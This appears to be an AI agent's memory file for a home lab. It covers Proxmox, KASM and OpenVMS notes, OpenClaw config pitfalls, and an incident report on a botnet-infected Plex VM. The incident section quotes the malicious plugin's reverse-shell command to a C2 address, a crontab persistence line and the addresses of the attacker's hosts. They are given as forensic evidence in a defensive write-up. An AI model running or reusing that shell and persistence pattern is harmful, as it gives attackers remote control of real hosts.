---
**[Learning from 2026-04-09 MP/M II Reconnaissance]**
The MP/M II system utilizes a manual drive/user area exploration model, distinct from modern filesystem abstractions. Observations include:
1. Drive A: Reported 'System Files Exist' when queried via `SDIR`.
2. Drives C:/D:: Trigger BDOS bad-sector errors with common commands (`USER`, `DIR`, `STAT`).
3. **Actionable Insight**: Future low-level analysis should prioritize `SDIR` commands on specific drives (e.g., `0A:`) to map core system files, respecting the vintage architecture's procedural nature.
---

**[Learning from 2026-04-24 VAXcluster Rebuild Audit]**
A fresh read-only audit confirmed the rebuilt OpenVMS VAXcluster topology and should be treated as current reference state: FUSION is the primary boot/MSCP server with DECnet 12.106 and TCP/IP 192.168.1.137, while RISE is the satellite with DECnet 12.107 and TCP/IP 192.168.1.138, using the shared root on `FUSION$DUA0:[SYS10.]` and local page/swap on `RISE$DUA0:`. Canonical environment notes now live in `FUSION_ENVIRONMENT_2026-04-24.md` and `RISE_ENVIRONMENT_2026-04-24.md`.
---

**[Learning from 2026-07-06 KASM Workspaces Upgrade 1.18.1 → 1.19.0]**
KASM Workspaces lives in LXC 102 on proxima2 (Debian Trixie, Docker 29.6.1). Upgrade procedure:
1. Proxmox snapshot: `pct snapshot 102 <name>` (no dots/hyphens in name)
2. DB backup: `/opt/kasm/current/bin/utils/db_backup --path /opt/kasm/current --backup-file /opt/kasm/backups/<name>.tar -v` (needs `chmod 777` on backups dir)
3. Download: `curl -O https://kasm-static-content.s3.amazonaws.com/kasm_release_<version>.tar.gz` → extract → `bash upgrade.sh --proxy-port 443 -b --ignore-dep-failures`
4. `--ignore-dep-failures` needed for LXC (Wireguard/v4l2loopback unavailable)
5. Post-upgrade: `docker restart kasm_guac` if unhealthy (API race on simultaneous startup)
6. Prune old infra images: `docker rmi <image-ids>` (keep workspace images)
7. Access chain: Hebei → SSH root@proxima → SSH proxima2 → `pct exec 102 -- bash -c "..."`
8. Current version: 1.19.0 at `/opt/kasm/1.19.0`, symlink `/opt/kasm/current`
9. Non-KASM containers in same LXC: hbbs, hbbr (RustDesk), portainer_agent — unaffected by upgrade
10. Rollback: Proxmox snapshot or repoint `current` symlink to previous version dir

---

---

**[Learning from 2026-10-10 Proxima4 NIC Fault]**
Proxima4 (Turion II Neo N40L) experiences intermittent NIC failures where the network interface "just disappears," taking down the host and all VMs/LXCs on it (including LXC 103 Hebei — the OpenClaw gateway host). Recovery currently requires a physical power cycle of proxima4. Symptom from the gateway's perspective is simultaneous timeouts on both `ollama/minimax-m3:cloud` (primary) and `openai/gpt-5.6-terra` (fallback) during cron wake tasks. Likely candidates to investigate: NIC driver/firmware, power management (ASPM / runtime PM), or hardware degradation. Worth tracking failure frequency and considering a remote recovery path (IPMI/iLO) to avoid physical intervention.

---

## Security Incident — DDoS Botnet on VM 109 (Plexus) — 2026-10-20

**Status: RESOLVED — host deleted 2026-10-20 ~22:00.** Containment was achieved by **destroying the
VM**, not by cleaning it: the `plex` account had a nologin shell, `sudo` on the host required a
password (so processes could not be killed or the crontab stripped remotely), and no firewall
tooling (ufw/nft/iptables) was installed. Keith removed VM 109 outright; the host is now
unreachable and no C2 channel survives with it. Found by the `proxmox-health-3d` cron while
investigating a 95% CPU reading on Proxima5.

**Verification at removal:** `.gb` (pid 699029) had been running since 04:52:40 with an
ESTABLISHED TLS session to 45.56.82.212:443; `.uf_guard` (721948) and the UDP flooder (768627,
800 threads → 152.53.168.44) were live. DNS for `plexus.can.barnabasmusic.com` still resolves to
192.168.1.241 — stale record to clean up.

**Proxima5 crashed during the removal** (cluster dropped to 4/5 nodes, still quorate). VM 104
Pegasus and the stopped VMs 105/106 were resident on it. Cause not yet established — possibly
resource pressure during the removal, or unrelated. **Rebuild of Plexus pending**: new VM, fresh
Plex install, rotated account token, and the NFS mount unit recreated.

**Host compromised:** VM 109 "Plexus" (Proxmox VM, Proxima5, 192.168.1.241, Debian 13,
Plex 1.43.3.10828-00f62d37d). Compromised user: `plex` (uid 999, `/usr/sbin/nologin`).

**Chain of compromise**
1. Malicious Plex "codec" plugin dropped as
   `.../Plex Media Server/Codecs/4987be2-8e3461d4c82193c06183af3f-linux-x86_64/zz75920.so`
   (ELF .so, not stripped, mtime 2026-10-20 16:58). Its payload is a **reverse shell**:
   `/usr/bin/setsid /usr/bin/bash -c 'exec 0<>/dev/tcp/202.78.167.55/10570 1>&0 2>&0;
   exec /usr/bin/script -qc /bin/bash /dev/null' &` — `script -qc` is used because the `plex`
   account has a nologin shell, so a PTY is required.
2. C2/download server: **`202.78.167.55`** — port **10570** (reverse shell), port **8765**
   (payload host, path `/go_beacon_amd64` or `/go_beacon_arm64`, arch-aware).
3. Payload 1 — `/tmp/.gb`, 5.7 MB static Go binary ("go_beacon"), C2 channel to
   **`45.56.82.212:443`** (TLS). Args `la_au599433 tk_la_au512_3211ea` = bot/campaign IDs.
4. Payload 2 — `/tmp/.uf`, a **UDP flooder** (800 threads, 65000-byte random packets, 300 s
   bursts) targeting `152.53.168.44` on ports 22,80,443,3000,8080,8084.
5. Watchdog `/tmp/.uf_guard` re-materialises `.uf` from an embedded base64 blob and restarts it
   every 5 s (`/tmp/.uf_go` + `/tmp/.uf_cfg` + `/tmp/.uf.pid`).
6. Persistence: `plex` crontab → `*/1 * * * * pgrep -f [.]gb >/dev/null || nohup /tmp/.gb ... &`

**Detection signature worth remembering:** Proxmox reported VM 109 at only 3.7% CPU while the
*node* sat at 95%. **VM 109 has no QEMU guest agent**, so guest-internal load is invisible to
the Proxmox API — the node/CPU gap was the only clue. Inside the guest: load average 238–294,
`python3` at 350% CPU. For any node pegged well above its guest-reported CPU, check the guest
directly rather than trusting the Proxmox resource view.

**Blast radius (verified clean):** all other reachable hosts scanned for the payloads and
processes — proxima, proxima2-5, dockyards, kasm, arya, tg-b, simul, xaviernv, retrobench are
clean. NFS shares from 192.168.1.8 (`/Data/VIDEO`, `/Data/MP3_Library`, `/Data/GALLERY`) have no
plex-owned files written since 2026-10-17 — no spread to the media library. No SSH key planted
for `plex`, no systemd user units. No failed SSH logins in 7 days — access was via the Plex
plugin, not brute force. 707 `*.jpg` in /tmp are benign Plex thumbnails.

**Open items for Keith:** (1) ~~kill 699029 / 765066 / 721948 + clear the crontab line~~ — CLOSED
by destroying VM 109 (22:00); no process remains. (2) ~~delete `/tmp/.gb`, `/tmp/.uf*`,
`zz75920.so`, upgrade Plex~~ — CLOSED with the host; Plex 1.43.3.10828-00f62d37d is the affected
version to avoid on rebuild. (3) rotate the Plex account token and block 202.78.167.55 /
45.56.82.212 at the firewall — OPEN, for the replacement host (the old host had no ufw/nft/iptables
installed, so no blocklist could be applied). (4) the cluster has **zero backup jobs**, so VM 109
had no restore point — OPEN, worth fixing separately. (5) ~~decide the fate of the dead `test`
zfspool entry~~ — CLOSED 22:20, `pvesm remove test` on proxima; `pvesm status` no longer lists it.

**Post-recovery verification (22:10–22:20):** 0 matching sockets for `45.56.82.212`,
`202.78.167.55`, or `152.53.168.44` on **all five** Proxmox nodes (proxima, proxima2, proxima3,
proxima4, Proxima5). Cluster 5/5 nodes quorate, Ceph HEALTH_OK, 5 MONs, 5 OSDs up/in. VM 109
absent from `/cluster/resources` and no `109.conf` in any node's `qemu-server/` dir.

**### Proxmox cluster — standing caveats (2026-10-20 23:46 health report)

- **The bundled health script can under-report ZFS faults.** `cluster_status_report.sh` reads
  `pvesh /nodes/<node>/disks/zfs`, whose payload has **no `cap` field** (renders `cap n/a`) and
  whose attention heuristic checks only `health != ONLINE` — it never reads `zpool status` error
  text or vdev error counters. A pool with a **live checksum error reads as "healthy"**. Verified
  in the wild: PX3_Data0 on proxima3 reports `zpool status` = "unrecoverable error" while the
  script reports no issues. **Always cross-check `zpool status` + `zpool list -o cap` directly.**
- **PX3_Data0 (proxima3)** — raidz1 × 3 × 4 TB, 9.44 T, **91% used** (808 G free). Subvol
  `subvol-101-disk-0` = 5.76 T of a 7.10 T refquota, 410 G available. Capacity was 90% Apr–May,
  92% late Sep, 94% on 2026-10-03, then **flat since 2026-10-04** — static, not runaway.
  Live vdev **CKSUM=16 on /dev/sdc** (`ata-ST4000DM004-2CV104_ZTT2F1L6-part2`),
  `Reallocated_Sector_Ct=816`, `Command_Timeout=1`; sdb/sdd clean. Pool ONLINE,
  "No known data errors", 2026-10-11 scrub repaired 1M with 0 errors. **Never previously
  recorded** — needs a long SMART test + fresh scrub to clear.
- **Thin memory headroom** — proxima4 77.8% (12.4/15.9 G, 3.2 G swap in use, kvm/VM 103 Hebei
  at 9.2 G RSS); proxima 70.3% (5.6/7.9 G, 2.9 G swap in use, ceph-osd 1.6 G). Stable, but
  proxima has only 7.9 G total and no failure margin.
- **Zero backup jobs cluster-wide** (still open) — no restore point exists for any guest.
- `sudo pvesm status` is **not** in the NOPASSWD allowlist on the Proxmox nodes; `zpool list`,
  `zpool status`, `smartctl`, `qm`, `pct`, `pvesh` are. Read storage status via the API.

Related cluster facts:** `storage/proxima/test` (dead zfspool, mountpoint /test) was defined in
/etc/pve/storage.cfg with **no `test` pool on any node** — now removed 2026-10-20 22:20. Note
`pvesm remove proxima/test` fails with *"storage ID contains illegal characters"* — use the bare
storage ID: `pvesm remove test`. Separately, `HA resources: 0` and `Backup jobs: 0` cluster-wide
(confirmed: no `vzdump` tasks in the cluster task list, no vzdump in any root crontab, and
storage.cfg holds no PBS/nfs/cifs target — only `dir: local`, `lvmthin: local-lvm`, and the five
zfspools). VM 105 (HMC) and VM 106 (ArosOne) on Proxima5 are intentionally stopped.

---

## OpenClaw 2026.10.2 — Model, Config & Plugin Gotchas (2026-10-20)

Durable, repeatable traps hit while switching the default model and running `doctor`/`security audit` on hebei. Each cost real time; each has a one-line fix.

**Model selection (default is now `ollama/minimax-m3.1-flash:cloud`)**
- **Two independent allow lists.** `agents.defaults.modelPolicy.allow` is not enough — the gateway enforces `agents.entries.*.modelPolicy.allow` for model overrides and rejects with *"Model override … is not allowed for agent main"*. Both lists must carry the new model.
- **Per-agent override shadows the global default.** `openclaw models set` writes only `agents.defaults`; `agents.entries.main.model.primary` takes precedence for the `main` agent. Set it explicitly with `openclaw config set agents.entries.main.model.primary <model>` (the CLI has no `--agent` flag for `models set`).
- **Bracket-string config set is rejected.** `openclaw config set 'path=["a","b"]'` → "Invalid path bracket string". Use index form: `openclaw config set 'path[4]' 'value'`.
- **Cloud-route models are absent from the local catalog.** `minimax-m3.1-flash:cloud` is not in `ollama list` / `/api/tags`, yet `ollama show` resolves it and it runs. `openclaw models set` warns "not in the local model catalog" but still saves.
- **Probe via `openclaw infer model run --gateway --model <m> --prompt "Reply with exactly: PROVIDER-PROOF-OK"`.** `openclaw agent --agent main --model …` is blocked in this context ("Gateway agent from agent exec would lose inter-session attribution"). Fallback stays `openai/gpt-5.6-terra`.

**Config / security audit** <!-- project: github.com/GeoKM/jarvis-workspace -->
- **`plugins.allow` is an EXCLUSIVE allowlist** — any plugin id not in the list is disabled at activation (`dist/config-activation-shared-*.mjs`). A minimal list (e.g. `["codex"]`) would disable ollama/telegram/memory-core and break the gateway. Set it to the exact set of currently-enabled plugin ids (44 here: 42 bundled + `codex` + `perplexity`); disabled bundled plugins are deliberately excluded.
- **The non-secret API-key marker exemption is path-specific.** `isNonSecretApiKeyMarker` applies only to `models.providers.*.apiKey` — *not* to `memory.search.remote.apiKey`. A placeholder value there is still flagged; the only clean fix is `openclaw config unset memory.search.remote.apiKey` (no SecretRef migration — there is nothing to protect). Local ollama at 127.0.0.1:11434 needs no auth header.
- **`doctor --lint` flags USER.md > 4000 chars** (bootstrap truncation cap) — USER.md is 4550 bytes and should be trimmed.
- **Startup migrations pending** requires `openclaw doctor --fix` (mutating — needs owner approval).
- **Gateway memory pressure** (RSS 2.4–2.8 GiB vs 2.21 GiB threshold, 17–19 workers) with recurring "slow SQLite transaction" / "SQLite lock wait failed"; session DB 134M, agent dir 618M. Fix = gateway restart + session pruning. **Compaction failures** on minimax-m3.1-flash:cloud: "summary output budget (6553 tokens) exhausted" → guard cancels, 143-message history left uncompressed.
- **Dead-lettered delivery queue**: `openclaw health` reported 13 outbound Telegram messages permanently failed (oldest 64d ago) — still open.
- **Invalid skills are silently skipped.** `skills/aix-system-monitor/SKILL.md` had no YAML frontmatter → "Skipping invalid skill" on every load (the AIX cron still worked because it runs `run-aix-monitor.sh` as a `command` payload, not the skill). Fix = add `name` + `description` frontmatter.

**Skill authoring / Workshop** <!-- project: github.com/GeoKM/jarvis-workspace -->
- **Workshop publication standard is 10,000 chars.** `os-upgrade-lab-hosts` SKILL.md was 26,768 → restructured to a short procedure (8,855 chars) plus 8 reference files. **One source per meaning** — the first extraction pass left the `pct exec` block and the `shutdown -r now` rule in both SKILL.md and the reference; the reference must point back, not restate. **Never write "see X above"** — it breaks the moment sections move; name the file/section instead. **The frontmatter description is the routing surface** — rewrite it whenever the branches change.
- The `read` tool refuses a skill file already served whole in the current context ("Skill instructions were already served whole earlier in the current model context") — use `exec sed -n` to re-read it. `progress_card` rejects numeric strings: `limit`/`plan` need real integers and `plan` must be an array.

**Workspace git hygiene** <!-- project: github.com/GeoKM/jarvis-workspace -->
- 158 stray `collect-metrics.py.bak.*` / `*.broken-fragment.*` files (~924K) plus `__pycache__` were sitting untracked; `.gitignore` now excludes `__pycache__/`, `*.py[co]`, `*.bak.*`, `*.broken-fragment.*` (files left on disk, not deleted).
- A **fragmented** collector is ~1331 bytes; a working one is 11,063+. `ast.unparse()` round-trips split semicolon-chained statements (`a, l = check(...); all_alerts.extend(a); lines.extend(l)`) into separate statements — literal-text grep counts do not prove call counts.
- **GitHub auth**: the stored `ghp_` PAT was expired/revoked (401) and all three local SSH keys were rejected. Fixed by `gh auth login` with an **OAuth** token (`gho_…`, scopes: gist, read:org, repo, workflow) in the keyring; `credential.helper = gh auth git-credential` (global). Push to `GeoKM/jarvis-workspace` (public, default branch master) then succeeded.

## Unattended-Upgrades Rollout — No Reboots (2026-10-20)

Scope approved by Keith: non-Proxmox-cluster hosts only. Proxmox cluster nodes (proxima, proxima2-5) stay manual. manifold and Helios excluded. ArosOne ignored. cbm deferred (powered off). **No reboots anywhere.**

- **hebei (gateway, Ubuntu 24.04 noble)** — full config. Custom `20auto-upgrades` with `APT::Periodic::{Update-Package-Lists,Download-Upgradeable-Packages,Unattended-Upgrade,AutocleanInterval,Unattended-Upgrade-Delay}` plus `Unattended-Upgrade::Automatic-Reboot "false"` uncommented. Backup `/var/backups/openclaw-unattended-upgrades/20261020-132427/`.
- **All others (9 hosts)** — "K path": plain `apt-get install -y unattended-upgrades`, stock conffiles left alone; `Automatic-Reboot` stays commented (package default = false). The package postinst enables the service + timers itself.
- Host notes: xaviernv = Ubuntu 20.04 focal aarch64 (Jetson), sudo needs a password for file writes; simul = Debian 13 trixie (QEMU VM), `update-notifier-common` has no trixie candidate → replaced by `apt-config-auto-update`; retrobench = Debian 12 bookworm, liquorix 6.12.7-2, u-u 2.9.1+nmu3 already present; LXC/Pi hosts (dockyards, kasm, tg-b, arya, plexus, pidp11) run host/vendor kernels so apt will not replace them; tg-b is Ubuntu 26.04 resolute. **No kernel-blacklist file was written anywhere** — `keith` has no sudoers NOPASSWD for `/etc/apt/apt.conf.d` writes.
- **Caveat:** on stock config a kernel package *can* enter the upgrade queue on hebei/xaviernv/simul/retrobench. `Automatic-Reboot` is false everywhere, so it installs but does not reboot — it then shows as a `reboot_required` CRITICAL in the Lab Monitor digest until manually rebooted.
- Rollback (anywhere except hebei): `apt-get purge unattended-upgrades`.

## reboot_required Flag in linux-system-monitor (2026-10-20) <!-- project: github.com/GeoKM/jarvis-workspace -->

- `scripts/collect-metrics.py` computes `reboot_required` (needed/pkgs/reasons/kernel_age_h) from `/var/run/reboot-required{,.pkgs,.reason}` and emits it in the JSON snapshot; `scripts/parse-report.py` adds `check_reboot()` (CRITICAL when needed, else OK with running-kernel age), called once in `main()` after `check_docker`.
- Both branches verified on hebei: OK (`Reboot OK (running kernel 849.4h)`) and CRITICAL via a synthetic `/var/run/reboot-required` (header flipped, package list rendered, `[CRITICAL] reboot_required = True`); the synthetic flag was removed afterwards.
- Lesson: `collect-metrics.py` had been truncated to a 41-line fragment in an earlier session and was restored from `collect-metrics.py.bak.20261019-212104` (297-line working version). Many stale `.bak.20261019-212*` fragments exist — worth pruning.

---

## System Upgrades (2026-09-30)

### CBM: Debian 12 (Bookworm) → Debian 13 (Trixie)
CBM (`cbm.can.barnabasmusic.com`, `192.168.1.241`) — Intel Pentium 4 3.00GHz, 3.3GiB RAM, x86_64
- OS: Debian 13.7 (Trixie), Kernel: 6.12.111+deb13-amd64 (old 6.1.0-23-amd64 remains as GRUB fallback)
- Full-upgrade: 806 upgraded, 164 newly installed, 50 removed (~28 min on Pentium 4)
- Pre-upgrade: cleared 7 old kernels, 151M apt archives, 81.4M journal; redirected apt cache to /home/apt-cache (var only 1.3G free)
- Post-upgrade: dpkg --configure -a, apt-get -f install, apt-get autoremove --purge (~70 obsolete packages removed)
- Filesystems: DOS (/dev/sdb1 vfat), WIN (/dev/sdb5 vfat), WIN2K (/dev/sdc1 ntfs) — all remounted
- LVM: CBM-vg with root(7.2G), var(2.7G), home(25G), tmp(531M), swap; Disk: / 4.1G free (42%), /var 1.1G free (59%)
- sudo requires password (keith); blocks env vars (DEBIAN_FRONTEND) — must use dpkg --configure -a without env vars
- Wazuh agent installed (wazuh.list in apt sources.list.d)

### TG-B: Ubuntu 24.04 LTS (Noble) → Ubuntu 26.04.1 LTS (Resolute)
TG-B (`tg-b.can.barnabasmusic.com`, `192.168.1.187`) — LXC 107 on proxima3, AMD Turion II Neo N40L (1 core), 7.8G disk
- OS: Ubuntu 26.04.1 LTS (Resolute), Kernel: 7.0.14-17-pve (Proxmox host kernel — not upgraded)
- Full-upgrade: 197 packages; RAM temporarily increased 512→2048MiB for upgrade, then restored
- Notable: Python 3.12→3.14, OpenSSH 9.6→10.2, OpenSSL 3.0→3.5, curl 8.5→8.18, systemd→259.5, libc 2.39→2.43, sudo 1.9.15→1.9.17
- sudoers fix required: removed `Defaults:keith !requiretty` from /etc/sudoers.d/90-keith (requiretty removed in sudo 1.9.17)
- Twingate source migrated to deb822 format (twingate.sources); Ubuntu sources moved to /etc/apt/sources.list.d/ubuntu.sources
- do-release-upgrade doesn't support --dry-run or --sandbox
- sudo requires password; blocks env vars (same as CBM)

### Proxmox Container Map (reference):
| VMID | Name | Node | Memory | Status |
|------|------|------|--------|--------|
| 100 | Dockyards | proxima | 2048 MiB | running |
| 101 | Arya | proxima3 | 1024 MiB | running |
| 102 | KASM | proxima2 | 4096 MiB | running |
| 103 | Hebei | proxima4 | 9024 MiB | running |
| 104 | Pegasus | Proxima5 | 4096 MiB | running |
| 105 | HMC | Proxima5 | 4096 MiB | stopped |
| 106 | ArosOne | Proxima5 | 2048 MiB | stopped |
| 107 | tg-b | proxima3 | 512 MiB | running |
| 108 | Simul | proxima | 2048 MiB | running |
| 109 | Plexus | Proxima5 | 4096 MiB | running |

## Promoted From Short-Term Memory (Condensed 2026-10-20)

Auto-promoted monitoring snapshots from Aug–Sep 2026, distilled. Raw entries live in `memory/2026-08-*.md` … `memory/2026-09-*.md`; the promotion blocks were re-pushed verbatim on every promotion cycle and pushed MEMORY.md past the 20,000-char bootstrap cap.

- **Recurring fleet state (Aug–Sep 2026, since resolved or superseded):** xaviernv / cbm / Helios unreachable ("No route to host", persistent since 2026-08-13); security updates unapplied to proxima–proxima5 (22 pkgs each) and retrobench; swap pressure on proxima (2.2–3.0GiB), proxima2 (2.9–3.0GiB), proxima4, plexus (2.0–2.6GiB); disk at 92% on arya (`_export_LibraryPool_Archive`) and proxima3 (`_PX3_Data0_subvol-101-disk-0`).
- **Resolved by 2026-09-04:** hebei cleared its security-update backlog (24 pkgs → 0); proxima3 swap alert cleared (disk still 92%).
- **Standing remediation track:** apply security updates to the Proxmox cluster + retrobench; prune arya and proxima3 storage; diagnose the three unreachable hosts; investigate swap.
- **AIX midday monitor cron fix (2026-08-05):** payload changed from `agentTurn` → `command` (`bash .../run-aix-monitor.sh --all`), `sessionTarget: "isolated"`, `delivery.mode: "announce"` with `--best-effort-deliver`. <!-- project: github.com/GeoKM/jarvis-workspace -->
